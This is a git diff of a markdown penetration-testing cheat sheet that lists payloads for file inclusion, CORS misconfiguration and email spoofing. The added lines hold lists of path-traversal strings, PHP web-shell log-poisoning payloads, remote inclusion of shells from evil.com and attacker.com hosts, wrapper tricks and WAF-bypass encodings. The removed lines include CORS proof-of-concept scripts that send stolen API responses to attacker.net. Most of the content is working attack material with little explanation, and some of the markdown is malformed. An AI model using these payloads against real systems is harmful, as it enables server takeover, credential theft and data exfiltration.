@@ -1289,17 +1289,10 @@ window.onload = setMessage;
 
 # 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)
 
-### **Impact of File Inclusion:**
-1. Code execution on the server
-2. Code execution on the client side
-3. Denial of Service (DoS) attacks
-4. Information disclosure (passwords, usernames, system files)
-
 ### **Common LFI Parameters:**
 ```
 file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
 ```
-
 ### **Basic LFI Exploitation:**
 
 ## Summary
@@ -1325,21 +1318,6 @@ file, document, folder, root, path, pg, style, pdf, template, php_path, doc, con
 - [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
 - [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
 - [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
-
-## Local File Inclusion
-
-**File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.
-
-Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.
-
-```php
-<?php
-$file = $_GET['page'];
-include($file);
-?>
-```
-
-In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd
@@ -1372,136 +1350,121 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
 ```
+# 🔹 Basic LFI Payloads
 
-### Path Truncation
+* Linux file read: `../../../../etc/passwd` → Reads system user file.
+* Windows file read:  `..\..\..\..\windows\win.ini` → Access Windows config.
+* Absolute path:  `/etc/passwd` → Direct file inclusion attempt.
+* PHP source exposure: `index.php` → If misconfigured, source code disclosure.
+* Log file inclusion: `/var/log/apache2/access.log` → Useful for log poisoning.
 
-On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
+# 🔹 Basic RFI Payloads
 
-```powershell
-http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
-http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
-http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
-http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
-```
+* Remote file include: `http://attacker.com/shell.txt` → Executes remote hosted code.
+* HTTPS inclusion: `https://evil.com/payload.php` → Bypass HTTP-only filters.
+* FTP inclusion: `ftp://attacker.com/shell.txt` → Alternate protocol.
+* PHP wrapper remote: `http://evil.com/shell.php?cmd=id` → Command execution.
 
-### Filter Bypass
+# 🔹 Directory Traversal Techniques
 
-```powershell
-http://example.com/index.php?page=....//....//etc/passwd
-http://example.com/index.php?page=..///////..////..//////etc/passwd
-http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
-```
+* Standard traversal: `../../../../etc/passwd`
+* Deep traversal: `../../../../../../../../../etc/passwd`
+* Mixed traversal:  `..//..//..//etc/passwd`
+* Backslash traversal: ..\\..\\..\\windows\\win.ini`
+* Nested traversal:  ....//....//etc/passwd`
 
-## Remote File Inclusion
+# 🔹 LFI to RCE (Log Poisoning)
 
-> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
+* Inject PHP into logs:  User-Agent: <?php system($_GET['cmd']); ?>`  → Include `/var/log/apache2/access.log`
+* Trigger execution:  `/index.php?page=/var/log/apache2/access.log&cmd=id`
+* SSH log poisoning:  Inject payload → include `/var/log/auth.log`
+* Mail log poisoning:  Include `/var/log/mail.log`
 
-Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.
+# 🔹 PHP Wrappers Exploitation
 
-```ini
-allow_url_include = On
-```
+* Base64 source disclosure:  `php://filter/convert.base64-encode/resource=index.php`
+* Input stream execution:  `php://input` → Send POST payload with PHP code.
+* Data wrapper:  data:text/plain,<?php system($_GET['cmd']); ?>`
+* Zip wrapper:  zip://shell.zip#payload.php`
+* Phar wrapper:  phar://shell.jpg` → Triggers deserialization.
 
-Most of the filter bypasses from LFI section can be reused for RFI.
+# 🔹 File Upload + Inclusion
 
-```powershell
-http://example.com/index.php?page=http://evil.com/shell.txt
-```
+* Upload shell:  shell.php` → Include via LFI.
+* Image polyglot:  shell.jpg` containing PHP code → bypass filters.
+* Temp file inclusion: /tmp/phpXXXXXX` → Include uploaded temp file.
+* Session file inclusion:  /var/lib/php/sessions/sess_<id>` → Inject code in session.
 
-### Null Byte
+# 🔹 Null Byte Injection (Legacy)
 
-```powershell
-http://example.com/index.php?page=http://evil.com/shell.txt%00
-```
+* Null byte truncation:  `../../../../etc/passwd%00`
+* Bypass extension filter: shell.php%00.jpg`
+* Combined traversal + null:  ../../etc/passwd%00.php`
 
-### Double Encoding
+# 🔹 Encoding Tricks (WAF Bypass)
 
-```powershell
-http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
-```
+* URL encoding: `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
+* Double encoding: `%252e%252e%252fetc%252fpasswd`
+* UTF-8 encoding: `%c0%ae%c0%ae%c0%af`
+* Mixed encoding: `..%2f..%2f%65tc%2fpasswd`
 
-### Bypass allow_url_include
+# 🔹 Path & Filter Bypass Techniques
 
-When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+* Filter bypass with prefix:  `./../../../../etc/passwd`
+* Suffix bypass:  ../../../../etc/passwd.`
+* Add extension trick:  ../../../../etc/passwd%00.php`
+* Path confusion:  /var/www/../../etc/passwd`
+* Case variation (Windows):  ..\\..\\Windows\\Win.ini`
 
-1. Create a share open to everyone
-2. Write a PHP code inside a file : `shell.php`
-3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
-### **Basic RFI Exploitation:**
-```bash
-http://example.com/index.php?page=http://evil.com/shell.txt
-```
+# 🔹 Advanced LFI Tricks
 
-### **LFI/RFI Bypass Techniques:**
-- **Null byte injection:** `page=../../../etc/passwd%00`
-- **Double encoding:** `page=%252e%252e%252fetc%252fpasswd`
-- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php`
+* Environment variables:  `/proc/self/environ` → Inject code via headers.
+* Process file descriptor:  `/proc/self/fd/0` → Read input stream.
+* Command history:  `/root/.bash_history`
+* Config files:   `/etc/apache2/apache2.conf`
 
-**Tools:**
-- [Kadimus](https://github.com/P0cL4bs/Kadimus)
-- [LFISuite](https://github.com/D35m0nd142/LFISuite)
-- [fimap](https://github.com/kurobeats/fimap)
+# 🔹 RFI Advanced Payloads
 
-etc/passwd
-etc/passwd%00
-etc%2fpasswd
-etc%2fpasswd%00
-etc%5cpasswd
-etc%5cpasswd%00
-etc%c0%afpasswd
-etc%c0%afpasswd%00
-C:\boot.ini
-C:\WINDOWS\win.ini
-C:/apache2/log/access_log
-C:/apache2/log/error.log
-C:/apache2/log/error_log
-C:/documents and settings/administrator/desktop/desktop.ini
+* Remote shell execution:  `http://evil.com/shell.txt?cmd=id`
+* Parameterized RFI:  `http://evil.com/shell.php?cmd=whoami`
+* CDN abuse:  `https://cdn.attacker.com/payload.php`
+* Redirect chain:  `http://trusted.com/redirect?url=evil.com/shell.php`
 
-## LFI to RCE via /proc/*/fd
+# 🔹 WAF Bypass Techniques (LFI/RFI)
 
-1. Upload a lot of shells (for example : 100)
-2. Include `/proc/$PID/fd/$FD` where `$PID` is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.
+## 🧩 Obfuscation Tricks
 
-```ps1
-http://example.com/index.php?page=/proc/$PID/fd/$FD
-```
+* Mixed slashes:  `..\/..\/etc/passwd`
+* Extra dots:  `....//....//etc/passwd`
+* Path padding:  `../../../../etc/passwd////`
+* Random insertion:  ..;/..;/..;/etc/passwd`
 
-## LFI to RCE via /proc/self/environ
+## 🧩 Encoding + Traversal
 
-Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file
+* Combined encoding: %2e%2e/%2e%2e/%65tc/passwd`
+* Double encoded traversal:  %252e%252e%252f%252e%252e%252fetc%252fpasswd`
+* UTF bypass: %c0%ae%c0%ae%c0%afetc%c0%afpasswd`
 
-```powershell
-GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
-User-Agent: <?=phpinfo(); ?>
-```
-## LFI to RCE via upload
+## 🧩 Wrapper Bypass
 
-If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).
+* Case variation:  PHP://filter/convert.base64-encode/resource=index.php`
+* Mixed wrapper: `Php://Filter/...`
+* Nested wrapper: php://filter/resource=php://input`
 
-```powershell
-http://example.com/index.php?page=path/to/uploaded/file.png
-```
-## LFI to RCE via phpinfo()
+## 🧩 Extension Bypass
 
-PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
+* Fake extension:  shell.php.jpg`
+* Double extension:  `shell.php.png`
+* Trailing dot:  shell.php.`
+* Null byte (legacy): shell.php%00.jpg`
 
-> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
+# 🔹 Real-World Attack Scenarios
 
-Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
-
-### RCE via SSH
-
-Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
-
-```powershell
-ssh <?php system($_GET["cmd"]);?>@10.10.10.10
-```
-
-Then include the SSH log files inside the Web Application.
-
-```powershell
-http://example.com/index.php?page=/var/log/auth.log&cmd=id
-```
+* Sensitive file disclosure:    `../../../../etc/passwd` → Leak system users.
+* Source code disclosure:  `php://filter/...` → Reveal application logic.
+* Remote code execution:  Include uploaded shell or poisoned log.
+* Credential theft:  Read `/etc/shadow`, config files.
+* Full server compromise:  LFI → RCE via log/session poisoning.
 
 ### RCE via Mail
 
@@ -1547,10 +1510,7 @@ Then request the logs via the LFI and execute your command.
 ```ps1
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
-
----
-
-# 10. Missing or Insufficient SPF Record
+## 10. Missing or Insufficient SPF Record
 
 **Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.
 
@@ -1605,375 +1565,87 @@ Subject: Email Forgery due to missing SPF
 * [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
 * [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
 
-# **1. List of Vulnerabilities (CORS Attack Surface)**
+# 🔹 Basic CORS Misconfiguration Payloads
 
-* **1.1 `Access-Control-Allow-Origin: *` with Sensitive Data**
-  Any website can read API responses.
+* Reflect origin (basic bypass): Origin: https://evil.com → If server reflects it in Access-Control-Allow-Origin, full bypass.
+* Wildcard origin: Origin: https://anything.com → Works when Access-Control-Allow-Origin: * with credentials disabled.
+* Null origin: Origin: null → Some servers trust null (sandboxed iframe/file://).
+* Missing origin validation: Origin: attacker.com → Backend blindly trusts any origin.
 
-* **1.2 Reflection of Origin Header**
-  Server reflects `Origin:` header blindly.
+# 🔹 Origin Reflection Exploitation
 
-* **1.3 `Access-Control-Allow-Credentials: true` with Wildcard**
-  Allows attacker sites to steal authenticated data.
+* Arbitrary origin reflection:  Origin: https://evil.com → Response includes same origin.
+* Subdomain trick: Origin: https://trusted.com.evil.com → Bypasses weak startsWith() checks.
+* Suffix bypass: Origin: https://eviltrusted.com → Bypasses endsWith() checks.
+* Prefix bypass:  Origin: https://trusted.com@evil.com → Misparsed by naive validation.
+* Dot confusion: Origin: https://trusted.com. → Trailing dot bypass.
 
-* **1.4 Weak Domain Whitelist**
-  `.example.com` allows `attacker-example.com`.
+# 🔹 Scheme & Protocol Tricks
 
-* **1.5 Null Origin Trust**
-  Trusting `Origin: null` (sandboxed iframes, file://).
+* HTTP vs HTTPS confusion: Origin: http://trusted.com → Bypass HTTPS-only checks.
+* Mixed scheme: Origin: https://trusted.com:80
+* Unusual scheme:  Origin: chrome-extension://evil
+* File origin:  Origin: file:// → Often treated as trusted.
+* Data origin:  Origin: data://evil
 
-* **1.6 Subdomain Takeover → CORS Abuse**
-  Application trusts subdomains that are hijackable.
+# 🔹 Subdomain & Domain Confusion
 
-* **1.7 Misconfigured Allowed Headers**
-  Allowing attacker-controlled custom headers.
+* Subdomain injection: Origin: https://api.trusted.com.evil.com
+* Double domain: Origin: https://trusted.com.evil.org
+* Homoglyph attack:  Origin: https://truste𝘥.com → Unicode lookalike.
+* Case bypass:  Origin: https://TrUsTeD.com
+* DNS rebinding style:  Origin: https://attacker-controlled-domain
 
-* **1.8 Misconfigured Allowed Methods**
-  Exposing sensitive endpoints to `PUT`, `DELETE`, etc.
+# 🔹 Special Origin Values
 
-* **1.9 Preflight Request Bypass**
-  Forcing browser to skip OPTIONS checks.
+* Null origin exploit:  Use iframe with sandbox → Origin: null
+* Empty origin: Origin: (blank header)
+* localhost trust abuse:  Origin: http://localhost
+* Internal IP trust:  Origin: http://127.0.0.1
+* Private network bypass:  Origin: http://192.168.1.1
 
-* **1.10 JSONP + CORS Combination**
-  Leaks data even without CORS.
+# 🔹 Credentials Abuse (Critical)
 
----
+* Allow credentials misconfig:  Access-Control-Allow-Credentials: true + reflected origin → full data theft.
+* Session hijack via CORS:  Malicious site sends request → browser includes cookies automatically.
+* Combined exploit:  Origin: https://evil.com + credentials=true → read sensitive API response.
 
-# **2. Sample Payloads (Core Attack Payloads)**
+# 🔹 Preflight Request Manipulation
 
-(Simple, safe-to-read examples for testing)
+* Force preflight:  Access-Control-Request-Method: POST
+* Custom headers: Access-Control-Request-Headers: X-Auth-Token
+* Weak validation:  Server allows all methods/headers → full control.
+* Bypass filtering:  Add unexpected headers → server whitelists them improperly.
 
-### **2.1 Basic Exploit JavaScript (Reads Sensitive Data)**
+# 🔹 Advanced Exploitation Payloads
 
-```js
-fetch("https://victim.com/api/user", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(d => console.log(d));
-```
+## 🧩 Origin Obfuscation
 
-### **2.2 Malicious Website HTML PoC**
+* Mixed case: Origin: https://TrUsTeD.com
+* Trailing dot:  Origin: https://trusted.com.
+* Embedded credentials:  Origin: https://trusted.com@evil.com
+* Encoded origin:  Origin: https://trusted.com%2eevil.com
 
-```html
-<script>
-fetch("https://victim.com/api/profile", {credentials: "include"})
-  .then(resp => resp.text())
-  .then(data => alert(data));
-</script>
-```
+## 🧩 Encoding Tricks
 
-### **2.3 Origin Reflection Test**
+* URL encoded:  %68%74%74%70%73://evil.com
+* Double encoding:  %2565vil.com
+* Unicode encoding:  https://truste\u0064.com
+* Punycode:  https://xn--trsted-9qa.com
 
-Send request with:
+## 🧩 Header Manipulation
 
-```
-Origin: https://evil.com
-```
+* Duplicate Origin headers:  Origin: https://trusted.com, Origin: https://evil.com→ Some servers use last/first value inconsistently.
+* Inject via other headers:  X-Origin: https://evil.com
+* Proxy header abuse:  X-Forwarded-Origin: https://evil.com
 
-If response contains:
+## 🧩 Parsing Confusion
 
-```
-Access-Control-Allow-Origin: https://evil.com
-```
-
-→ Vulnerable.
-
-### **2.4 Null-Origin Test**
-
-Send:
-
-```
-Origin: null
-```
-
-If server allows:
-
-```
-Access-Control-Allow-Origin: null
-```
-
-→ Vulnerable.
-
----
-
-# **3. Bypass Payloads (Advanced Techniques)**
-
-### **3.1 Subdomain Bypass**
-
-Server whitelist:
-
-```
-Access-Control-Allow-Origin: *.example.com
-```
-
-Attacker uses:
-
-```
-evil.example.com
-```
-
-### **3.2 Wildcard With Credentials**
-
-If server sends:
-
-```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Credentials: true
-```
-
-Browser blocks normally, BUT attackers use **header splitting**:
-
-```
-Origin: https://evil.com:443/
-```
-
-### **3.3 Case Manipulation**
-
-```
-Origin: HTTPS://EVIL.COM
-```
-
-Some servers match case-insensitive incorrectly.
-
-### **3.4 Null-Origin Bypass via sandboxed iframe**
-
-```html
-<iframe sandbox="allow-scripts" src="data:text/html,<script>
-fetch('https://victim.com/api',{credentials:'include'})
-.then(r=>r.text()).then(alert);
-</script>"></iframe>
-```
-
-### **3.5 Broken Regex Whitelist**
-
-Whitelist:
-
-```
-/.*example\.com$/
-```
-
-Attacker:
-
-```
-https://example.com.evil.net
-```
-
-### **3.6 JSON Content-Type Bypass**
-
-```js
-fetch("https://victim.com/secret", {
-  method: "POST",
-  headers: {"Content-Type": "text/plain"},
-  body: "test"
-})
-```
-
-### **3.7 Forbidden Header Bypass**
-
-Server incorrectly allows:
-
-```
-Access-Control-Allow-Headers: *
-```
-
-Attacker sets:
-
-```
-X-Api-Key: evil
-```
-
----
-
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
-
-### **4.1 Database Exposure (User Data)**
-
-```js
-fetch("https://victim.com/api/v1/users/me", {
-  credentials: "include"
-})
-.then(r => r.json())
-.then(console.log);
-```
-
-### **4.2 Payment Endpoint Access**
-
-```js
-fetch("https://victim.com/payment/history", {
-  credentials: "include"
-}).then(r => r.text()).then(console.log);
-```
-
-### **4.3 Token Leaking via CORS**
-
-```js
-fetch("https://victim.com/auth/token", {
-  credentials: "include"
-}).then(r => r.json()).then(alert);
-```
-
-### **4.4 Preflight Abuse**
-
-```js
-fetch("https://victim.com/internal/admin", {
-  method: "PUT",
-  headers: {
-    "X-Custom": "test"
-  },
-  credentials: "include"
-})
-```
-
-### **4.5 Hijacked Subdomain Exploit**
-
-```js
-fetch("https://sub.victim.com/admin/logs", {credentials:'include'})
-.then(r=>r.text())
-.then(console.log);
-```
-
----
-
-# **5. Validation / Test Steps**
-
-**Step 1:** Send request with custom Origin
-→ check reflected `Access-Control-Allow-Origin`.
-
-**Step 2:** Test credentialed requests
-→ `credentials: include`.
-
-**Step 3:** Test allowed methods and headers
-→ `PUT`, `DELETE`, `X-Custom-Header`.
-
-**Step 4:** Try null-origin
-→ `Origin: null`.
-
-**Step 5:** Try subdomain and bypass patterns
-→ wildcard, regex, IPv6, encoded origins.
-
----
-
-# **6. Expected Results / Impact**
-
-* Theft of **user data**, **tokens**, **sessions**.
-* Access to internal admin APIs.
-* Full account takeover through authenticated CORS misuse.
-* Payment history leakage.
-* Internal network exposure via SSRF-like effects.
-
----
-
-#### Proof Of Concept
-
-This PoC requires that the respective JS script is hosted at `evil.com`
-
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://victim.example.com/endpoint',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
-```
-
-or
-
-```html
-<html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://victim.example.com/endpoint", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
-```
-### Wildcard Origin without Credentials
-
-If the server responds with a wildcard origin `*`, **the browser does never send the cookies**. However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication.
-
-```powershell
-* is the only wildcard origin
-https://*.example.com is not valid
-```
-
-#### Vulnerable Implementation
-
-```powershell
-GET /endpoint HTTP/1.1
-Host: api.internal.example.com
-Origin: https://evil.com
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-
-{"[private API key]"}
-```
-
-#### Proof Of Concept
-
-```js
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://api.internal.example.com/endpoint',true); 
-req.send();
-
-function reqListener() {
-    location='//attacker.net/log?key='+this.responseText; 
-};
-```
-### Expanding the Origin
-
-Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
-
-#### Vulnerable Implementation (Example 1)
-
-In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
-
-```ps1
-GET /endpoint HTTP/1.1
-Host: api.example.com
-Origin: https://evilexample.com
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evilexample.com
-Access-Control-Allow-Credentials: true 
-
-{"[private API key]"}
-```
-#### Vulnerable Implementation (Example 2)
-
-In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
-
-```ps1
-GET /endpoint HTTP/1.1
-Host: api.example.com
-Origin: https://apiiexample.com
-
-HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://apiiexample.com
-Access-Control-Allow-Credentials: true 
-
-{"[private API key]"}
-```
+* Multiple values:  Origin: https://trusted.com, https://evil.com
+* Whitespace tricks:  Origin:   https://evil.com
+* Newline injection:  Origin: https://evil.com%0a
+* Tab injection:  Origin: https://evil.com%09
+  
 # CRLF Injection
 
 ## Methodology
